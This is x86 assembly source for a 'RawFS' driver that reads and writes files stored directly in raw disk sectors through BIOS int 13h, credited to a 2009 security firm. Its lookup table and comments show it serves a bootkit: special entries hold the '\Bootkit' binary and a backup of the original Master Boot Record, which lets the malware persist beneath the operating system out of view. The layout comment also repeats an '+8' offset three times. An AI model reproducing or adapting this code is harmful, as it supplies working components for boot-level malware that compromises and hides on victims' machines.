
; RawFS Functions
;   Load_File_RawFS
;   Open_File_RawFS
;   Read_File_RawFS
;   Write_File_RawFS




Load_File_RawFS:

; loads a file from a RawFS volume

; Source
;       Drive Context..........................[Drive_Context]
;       File Name..............................[Param1]
;       Buffer.................................[Param2]

mov eax,[Drive_Context + 0]
mov [NextFileTable],dword 0


RawFS_Next_FileTable:

; read the next File Table and handle 8 entries
Read  [NextFileTable], 1, Load_File_RawFS_Exit
mov [NextFileTable],dword 0                                                     ; no next File Table currently
mov ecx,8
mov si,Sector_Buffer


RawFS_Next_Entry:

; last entry?
cmp [si + 0],dword 0                                                            ; sector number = 0?
je Load_File_RawFS_Error_Not_Found

; File Table?
mov di,MD5_FileTable
call Compare_MD5_Lookup
jne RawFS_Not_File_Table

mov eax,[si + 0]                                                                ; set the next File Table
mov [NextFileTable],eax

RawFS_Not_File_Table:

; searched file?
mov di,[Param1]
call Compare_MD5_Filename
jne RawFS_Not_Searched_File
cmp [di],byte 0                                                                 ; zero terminator?
je Load_File_RawFS_Read                                                         ; found the file!

RawFS_Not_Searched_File:                                                        ; next entry!
add si,64
loop RawFS_Next_Entry

cmp [NextFileTable],dword 0
jne RawFS_Next_FileTable


Load_File_RawFS_Error_Not_Found:                                                ; file not found
mov eax,Invalid_Name
stc

ret


Load_File_RawFS_Read:                                                           ; found the file, read it into memory

mov eax,[si + 0]                                                                ; set the sector number
add eax,[Drive_Context + 0]
mov [Disk_Address_Packet_LBA_Low],eax                                           ; (Sector Number)

; set the count
movzx eax,word [Drive_Context + 04h]                                            ; bytes per sector
dec eax                                                                         ; -1 (will be rounded up to bytes per sector)
add eax,dword [si + 8]                                                          ; Data Length
movzx ecx,word [Drive_Context + 04h]                                            ; bytes per sector
xor edx,edx
div ecx                                                                         ; sectors to read (round up)
mov [Disk_Address_Packet_Count],eax                                             ; (Sector Count)

; set the Segment:Offset
mov ebx,[Param2]                                                                ; linear address
ror ebx,4                                                                       ; -> segment (/16)
mov [Disk_Address_Packet_Buffer+2],bx                                           ; (Segment)
shr ebx,32-4                                                                    ; -> offset
mov [Disk_Address_Packet_Buffer],bx                                             ; (Offset)

; interrupt 13h, Function 42h: Extended Read
mov si,Disk_Address_Packet_Size
mov dl,[Drive_Context + 1Eh]
mov ah,42h
int 13h
jc Load_File_RawFS_Exit

; return successful
clc
xor eax,eax

ret


Load_File_RawFS_Exit:

ret






Open_File_RawFS:

; (same source as Load_File_RawFS)

mov eax,[Drive_Context + 0]
mov [NextFileTable],dword 0

RawFS_Open_Next_FileTable:

; read the next File Table and handle 8 entries
Read  [NextFileTable], 1, Load_File_RawFS_Exit
mov [NextFileTable],dword 0                                                     ; no next File Table currently
mov ecx,8
mov si,Sector_Buffer


RawFS_Open_Next_Entry:

; last entry?
cmp [si + 0],dword 0                                                            ; sector number = 0?
je Load_File_RawFS_Error_Not_Found

; File Table?
mov di,MD5_FileTable
call Compare_MD5_Lookup
jne RawFS_Open_Not_File_Table

mov eax,[si + 0]                                                                ; set the next File Table
mov [NextFileTable],eax

RawFS_Open_Not_File_Table:

; searched file?
mov di,[Param1]
call Compare_MD5_Filename
jne RawFS_Open_Not_Searched_File
cmp [di],byte 0                                                                 ; zero terminator?
jne RawFS_Open_Not_Searched_File                                                ; found the file!

; set up the handle
mov eax,[si + 0]                                                                ; Sector number
mov [Handle_Context + 4],eax
mov ebx,[si + 8]                                                                ; File Size
mov [Handle_Context + 8],ebx
mov [Handle_Context + 12],dword 0                                               ; Current byte position
clc                                                                             ; return with status = successful
jmp Load_File_RawFS_Exit

RawFS_Open_Not_Searched_File:                                                   ; next entry!
add si,64
loop RawFS_Open_Next_Entry

cmp [NextFileTable],dword 0
jne RawFS_Open_Next_FileTable
jmp Load_File_RawFS_Error_Not_Found







Read_File_RawFS:

; Source
;       Drive Context..........................[Drive_Context]
;       Handle Context.........................[Handle_Context]
;       Read Buffer............................[Param2]
;       Bytes to read..........................[Param3]

; WARNING! only sector based I/O

; set the sector number
mov eax,[Handle_Context + 12]                                                   ; Current Byte Position
shr eax,9                                                                       ; / 512
add eax,[Handle_Context + 4]                                                    ; + Start Sector of file
add eax,[Drive_Context + 0]
mov [Disk_Address_Packet_LBA_Low],eax                                           ; (Sector Number)

; set the count
mov eax,[Param3]                                                                ; size to read
shr eax,9                                                                       ; / 512
mov [Disk_Address_Packet_Count],eax                                             ; (Sector Count)

; set the Segment:Offset
mov ebx,[Param2]                                                                ; linear address
ror ebx,4                                                                       ; -> segment (/16)
mov [Disk_Address_Packet_Buffer+2],bx                                           ; (Segment)
shr ebx,32-4                                                                    ; -> offset
mov [Disk_Address_Packet_Buffer],bx                                             ; (Offset)

; interrupt 13h, Function 42h: Extended Read
mov si,Disk_Address_Packet_Size
mov dl,[Drive_Context + 1Eh]
mov ah,42h
int 13h
jc Load_File_RawFS_Exit

; return successful
clc
xor eax,eax

ret






Write_File_RawFS:

; Source
;       Drive Context..........................[Drive_Context]
;       Handle Context.........................[Handle_Context]
;       File Buffer............................[Param2]
;       Bytes to write.........................[Param3]

; WARNING! only sector based I/O

; set the sector number
mov eax,[Handle_Context + 12]                                                   ; Current Byte Position
shr eax,9                                                                       ; / 512
add eax,[Handle_Context + 4]                                                    ; + Start Sector of file
add eax,[Drive_Context + 0]
mov [Disk_Address_Packet_LBA_Low],eax                                           ; (Sector Number)

; set the count
mov eax,[Param3]                                                                ; size to read
shr eax,9                                                                       ; / 512
mov [Disk_Address_Packet_Count],eax                                             ; (Sector Count)

; set the Segment:Offset
mov ebx,[Param2]                                                                ; linear address
ror ebx,4                                                                       ; -> segment (/16)
mov [Disk_Address_Packet_Buffer+2],bx                                           ; (Segment)
shr ebx,32-4                                                                    ; -> offset
mov [Disk_Address_Packet_Buffer],bx                                             ; (Offset)

; interrupt 13h, Function 43h: Extended Write
mov si,Disk_Address_Packet_Size
mov dl,[Drive_Context + 1Eh]
mov ax,4300h
int 13h
jc Load_File_RawFS_Exit

; return successful
clc
xor eax,eax

ret





Compare_MD5_Filename:

push si
push cx
add si,32

; mask out uppercase
mov ecx,8
movzx esi,word si
movzx edi,word di
Mask_Uppercase_MD5:
or [esi + 4*ecx -4],dword 20202020h
or [edi + 4*ecx -4],dword 20202020h
loop Mask_Uppercase_MD5

; compare 32 characters
mov cx,32
repe cmpsb

pop cx
pop si

ret




Compare_MD5_Lookup:

; si = RawFS File Table entry to compare
; di = MD5 to compare (index in the MD5 Lookup Table)

; (internal function)

push si
push cx
add si,32

; mask out uppercase
or [si + 0],dword 20202020h
or [si + 4],dword 20202020h
or [si + 8],dword 20202020h
or [si + 12],dword 20202020h
or [si + 16],dword 20202020h
or [si + 20],dword 20202020h
or [si + 24],dword 20202020h
or [si + 28],dword 20202020h

; get the MD5 to compare
shl di,5                                                                        ; * 32
add di,MD5_Lookup_Table

; compare 32 characters
mov cx,32
repe cmpsb

pop cx
pop si

ret




; MD5 Lookup Table (warning! must be lowercase)
MD5_Lookup_Table:
db "8f58eadd7bfff0c557d4b5e9656957a5"   ; \Bootkit
db "0f13c73aab0d4e000028038c99d3125a"   ; \Master Boot Record.bak
db "b05b32a085defc9f4299c35ac8f358cd"   ; \File Table




; RawFS driver
;  - sector sized
;  - contains 8 entries for hard drives, 32 for CDs
;  - each entry has the format
;
;        + 0   8 bytes     Sector number of the file
;        + 8   8 bytes     Size in bytes of the file, multiple of 512
;        + 8   8 bytes     Real size of the file
;        + 8   8 bytes     Reserverd for future attributes
;        + 32  32 chars    32-byte MD5 hash of the file name
;        -------------------------------------------------------------
;              64 bytes per entry
;
;  - special entries (fixed md5 of the names)
;
;        B05B32A085DEFC9F4299C35AC8F358CD    \File Table                 Next block of File Table
;        8F58EADD7BFFF0C557D4B5E9656957A5    \Bootkit                    Bootkit binary
;        0F13C73AAB0D4E000028038C99D3125A    \Master Boot Record.bak     Original MBR
;        …                                   \…                          All other files

; limitations:
;   - currently only supports hard disks (512 byte sectors)
;   - enumeration function missing
;   - file deletion function missing

; usual occupation:
;  1. Master Boot Record Backup
;  2. \Bootkit

; - RawFS_CheckVolumeExists
; - RawFS_GetFileInfo
; - RawFS_ReadFile
; - RawFS_WriteFile
; - RawFS_DeleteFile
; - RawFS_FormatVolume

; (C) 2009 Insecurity Systems InSec e.U., written by Peter Kleissner
